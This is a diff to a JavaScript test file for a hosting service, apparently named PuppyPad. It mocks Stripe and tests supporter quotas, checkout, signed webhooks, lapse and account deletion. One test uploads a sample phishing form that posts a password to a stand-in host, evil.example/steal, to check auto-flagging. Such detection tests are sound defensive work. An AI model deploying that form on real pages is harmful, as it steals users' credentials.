@@ -12,8 +12,36 @@ process.env.ADMIN_EMAILS = 'boss@example.com';
 process.env.SHOT_TOKEN = 'test-shot-token';
 process.env.QUOTA_MB = '1';
 process.env.MAX_FILE_MB = '1';
+process.env.SUPPORTER_QUOTA_MB = '3';
+process.env.SUPPORTER_MAX_FILE_MB = '2';
+process.env.STRIPE_SECRET_KEY = 'sk_test_fake';
+process.env.STRIPE_WEBHOOK_SECRET = 'whsec_test';
+process.env.STRIPE_PRICE_ID = 'price_test';
 delete process.env.SMTP_HOST;
 delete process.env.TURNSTILE_SECRET_KEY;
+
+// Stripe's API is never called: Checkout and the billing portal answer from here, and webhooks are signed for real
+const Stripe = require('stripe');
+const stripeCalls = [];
+// what the fake Stripe holds: open checkouts and subscriptions per customer; fail makes every call throw
+const fake = { customers: 0, open: [], subs: [], cancelled: [], fail: false };
+const listed = (data) => Object.assign(Promise.resolve({ data }), { [Symbol.asyncIterator]: async function* () { yield* data; } });
+const stripeCall = (fn) => (...a) => { if (fake.fail) throw new Error('Stripe is down'); stripeCalls.push(a[0]); return fn(...a); };
+require.cache[require.resolve('stripe')].exports = function FakeStripe(key) {
+  const s = new Stripe(key);
+  s.customers = { create: stripeCall(async () => ({ id: `cus_test${++fake.customers}` })) };
+  s.checkout = { sessions: {
+    create: stripeCall(async () => ({ url: 'https://checkout.stripe.com/c/pay/test' })),
+    list: stripeCall(({ customer }) => listed(fake.open.filter((o) => o.customer === customer))),
+  } };
+  s.subscriptions = {
+    list: stripeCall(({ customer }) => listed(fake.subs.filter((o) => o.customer === customer))),
+    retrieve: stripeCall(async (id) => fake.subs.find((o) => o.id === id)),
+    cancel: stripeCall(async (id) => { fake.cancelled.push(id); return { id, status: 'canceled' }; }),
+  };
+  s.billingPortal = { sessions: { create: stripeCall(async () => ({ url: 'https://billing.stripe.com/p/session/test' })) } };
+  return s;
+};
 
 // without SMTP the app prints mail to the console; keep it so tests can follow the links
 const mail = [];
@@ -2276,4 +2304,123 @@ test('file history keeps each save of a text file, puts old versions back and br
   // deleting the account deletes its history
   await post(m, '/dashboard/delete-account', { password: 'longpassword1' });
   assert.ok(!H.exists(user.id));
+});
+
+test('supporters get bigger limits and any file type; when support lapses nothing is deleted', async () => {
+  const m = await member('bigdog');
+  const big = Buffer.alloc(1.5 * 1048576, 65);
+  const api = (path) => req('get', path);
+  assert.match((await upload(m, 'tool.exe', 'MZ')).text, /tool\.exe \(name or file type not allowed\)/);
+  assert.equal((await upload(m, 'big.png', big)).status, 400); // over the free 1 MB file limit
+  db.prepare('UPDATE users SET supporter_until = ? WHERE username = ?').run(Date.now() + 86400000, 'bigdog');
+  assert.match((await upload(m, 'tool.exe', 'MZ')).text, /Uploaded 1 file/);
+  assert.match((await upload(m, 'big.png', big)).text, /Uploaded 1 file/);
+  const dash = (await req('get', '/dashboard').set('Cookie', m.cookie)).text;
+  assert.match(dash, /of 3 MB/);
+  assert.match(dash, /data-max="2097152"/); // the drag-and-drop uploader checks sizes against the supporter limit too
+  // a supporter's rarer page types are still checked for phishing
+  await upload(m, 'login.xhtml', '<form action="https://evil.example/steal"><input type="password" name="pw"> verify your account</form>');
+  assert.match(db.prepare("SELECT details FROM reports WHERE site = 'bigdog' AND reason = 'Auto-flag'").get().details, /^login\.xhtml:/);
+  // the CLI reads its limits from the API
+  const key = (await req('post', '/dashboard/api').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf, action: 'new', password: 'longpassword1' })).text.match(/<pre>([^<]+)<\/pre>/)[1];
+  const site = (await api('/api/site').set('Authorization', `Bearer ${key}`)).body;
+  assert.equal(site.any_type, true);
+  assert.equal(site.quota_bytes, 3 * 1048576);
+  assert.equal(site.max_file_bytes, 2 * 1048576);
+  // lapsed: the files stay, but nothing new goes in while the site is over the free quota
+  db.prepare('UPDATE users SET supporter_until = ? WHERE username = ?').run(Date.now() - 1000, 'bigdog');
+  assert.ok(fs.existsSync(path.join(process.env.DATA_DIR, 'sites', 'bigdog', 'big.png')));
+  assert.equal((await req('get', '/big.png', 'bigdog.pad.test')).status, 200);
+  assert.match((await upload(m, 'note.txt', 'hi')).text, /note\.txt \(over your 1 MB limit\)/);
+  assert.equal((await api('/api/site').set('Authorization', `Bearer ${key}`)).body.any_type, false);
+  // and any file that is there can still be deleted
+  await req('post', '/dashboard/delete').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf, path: 'tool.exe' });
+  assert.ok(!fs.existsSync(path.join(process.env.DATA_DIR, 'sites', 'bigdog', 'tool.exe')));
+});
+
+test('supporting through Stripe: checkout, webhook, flair, billing portal and lapse', async () => {
+  const m = await member('goodboy');
+  const signer = new Stripe('sk_test_fake').webhooks;
+  const hook = (type, object, secret = 'whsec_test') => {
+    const payload = JSON.stringify({ id: `evt_${type}`, object: 'event', type, data: { object } });
+    return req('post', '/stripe/webhook').set('Content-Type', 'application/json')
+      .set('Stripe-Signature', signer.generateTestHeaderString({ payload, secret })).send(payload);
+  };
+  // Stripe now holds sub as it is, and sends an event about it
+  const subHook = (type, sub) => { fake.subs = fake.subs.filter((o) => o.id !== sub.id).concat(sub); return hook(type, sub); };
+  const row = () => db.prepare('SELECT * FROM users WHERE username = ?').get('goodboy');
+  const page = await req('get', '/dashboard/support').set('Cookie', m.cookie);
+  assert.match(page.text, /Become a supporter/);
+  assert.match(page.headers['content-security-policy'], /form-action 'self' https:\/\/checkout\.stripe\.com/);
+  assert.match((await req('get', '/dashboard').set('Cookie', m.cookie)).text, /href="\/dashboard\/support"/);
+  const go = await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf });
+  assert.equal(go.status, 303);
+  assert.equal(go.headers.location, 'https://checkout.stripe.com/c/pay/test');
+  const call = stripeCalls.at(-1);
+  const cus = row().stripe_customer_id;
+  assert.match(cus, /^cus_test/); // made before checkout, so every try finds the same customer
+  assert.equal(call.client_reference_id, String(row().id));
+  assert.equal(call.customer, cus);
+  assert.deepEqual(call.line_items, [{ price: 'price_test', quantity: 1 }]);
+  assert.deepEqual(call.subscription_data.billing_mode, { type: 'flexible' });
+  // a second try before paying reopens the same checkout instead of starting a second subscription
+  fake.open.push({ customer: cus, url: 'https://checkout.stripe.com/c/pay/open' });
+  const again = await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf });
+  assert.equal(again.headers.location, 'https://checkout.stripe.com/c/pay/open');
+  fake.open = [];
+  // paid, but the webhook hasn't arrived: no second checkout either
+  fake.subs.push({ id: 'sub_1', customer: cus, status: 'active' });
+  assert.equal((await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf })).status, 409);
+
+  // forged or unsigned webhooks change nothing
+  const before = row().supporter_until;
+  assert.equal((await hook('customer.subscription.created', { id: 'sub_1', customer: cus, status: 'active', metadata: {}, items: { data: [{ current_period_end: 2e9 }] } }, 'whsec_wrong')).status, 400);
+  assert.equal(row().supporter_until, before);
+  assert.equal((await hook('checkout.session.completed', { customer: cus, client_reference_id: String(row().id) })).status, 200);
+  assert.equal(row().stripe_customer_id, cus);
+  const end = Math.floor(Date.now() / 1000) + 30 * 86400;
+  const live = { id: 'sub_1', customer: cus, status: 'active', metadata: {}, items: { data: [{ current_period_end: end }] } };
+  await subHook('customer.subscription.created', live);
+  assert.ok(row().supporter_until > end * 1000);
+
+  // flair wherever the name shows, and the count on the home page
+  assert.match((await req('get', '/site/goodboy')).text, /class="pic supporter"/);
+  assert.match((await req('get', '/site/goodboy')).text, /alt="PuppyPad supporter"/);
+  assert.match((await req('get', '/')).text, /kept running by \d+ supporters?/);
+  assert.equal((await req('get', '/img/supporter.svg')).status, 200);
+  assert.match((await req('get', '/dashboard/support').set('Cookie', m.cookie)).text, /You are a supporter until/);
+  // already supporting: no second subscription, but the billing portal
+  assert.equal((await req('post', '/dashboard/support').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf })).status, 409);
+  const portal = await req('post', '/dashboard/support/portal').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf });
+  assert.equal(portal.headers.location, 'https://billing.stripe.com/p/session/test');
+  assert.equal(stripeCalls.at(-1).customer, cus);
+
+  // cancelled: the perks and the flair stop at once
+  await subHook('customer.subscription.deleted', { ...live, status: 'canceled' });
+  assert.ok(row().supporter_until <= Date.now());
+  // an older event arriving late can't bring the perks back: what Stripe holds now wins
+  await hook('customer.subscription.updated', live);
+  assert.ok(row().supporter_until <= Date.now());
+  assert.doesNotMatch((await req('get', '/site/goodboy')).text, /alt="PuppyPad supporter"/);
+  assert.match((await req('get', '/dashboard/support').set('Cookie', m.cookie)).text, /Your support ended/);
+  // a subscription carries its member in metadata, so it lands even before checkout's event links the customer
+  await member('latepup');
+  const pupId = db.prepare('SELECT id FROM users WHERE username = ?').get('latepup').id;
+  await subHook('customer.subscription.created', { id: 'sub_2', customer: 'cus_2', status: 'active', metadata: { user_id: String(pupId) }, items: { data: [{ current_period_end: end }] } });
+  assert.ok(db.prepare('SELECT supporter_until FROM users WHERE id = ?').get(pupId).supporter_until > Date.now());
+
+  // deleting the login cancels its live subscription first (one the webhooks haven't reported yet too), and keeps the account if Stripe can't be reached
+  fake.subs.push({ id: 'sub_3', customer: cus, status: 'active' });
+  const del = () => req('post', '/dashboard/delete-account').set('Cookie', m.cookie).type('form').send({ _csrf: m.csrf, password: 'longpassword1' });
+  fake.fail = true;
+  assert.equal((await del()).status, 502);
+  assert.ok(row());
+  fake.fail = false;
+  assert.equal((await del()).status, 200);
+  assert.deepEqual(fake.cancelled, ['sub_3']);
+  assert.equal(row(), undefined);
+
+  // the terms and the privacy page say what supporting means and who takes the money
+  assert.match((await req('get', '/rules')).text, /id="supporter-terms"/);
+  assert.match((await req('get', '/privacy')).text, /processed by Stripe/);
 });
